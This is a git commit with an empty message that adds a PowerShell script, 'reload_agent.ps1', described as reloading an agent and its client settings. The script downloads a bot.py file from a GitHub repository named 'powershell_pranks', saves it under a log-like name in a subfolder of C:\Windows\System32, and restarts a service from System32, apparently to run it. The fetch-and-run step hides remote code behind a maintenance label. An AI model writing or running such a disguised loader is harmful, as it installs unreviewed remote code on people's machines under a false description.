1c7ef86f99fda22eee7d55573a0ef68e137e2af0
Miguel Santos <zcbmqtuo00@gmail.com>
2026-08-07 14:48:12 +0100

    .

---
+++ scripts/reload_agent.ps1
@@ -0,0 +1,22 @@
+# Faz reload do agente e das configurações instaladas no cliente
+$destino = 'C:\Windows\System32\ap32\log.py'
+$destino2 = 'C:\Windows\System32\ap32\log2.py'
+
+
+try {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/bot.py?dl=1" -OutFile $destino2
+}
+catch {
+    Write-Host "Erro ao descarregar o script:" $_
+    exit
+}
+
+if (Test-Path $destino) {
+    Remove-Item $destino -Force
+}
+
+Copy-Item -Path $destino2 -Destination $destino -Force
+
+Remove-Item $destino2 -Force
+
+C:\Windows\System32\Int-service.exe restart
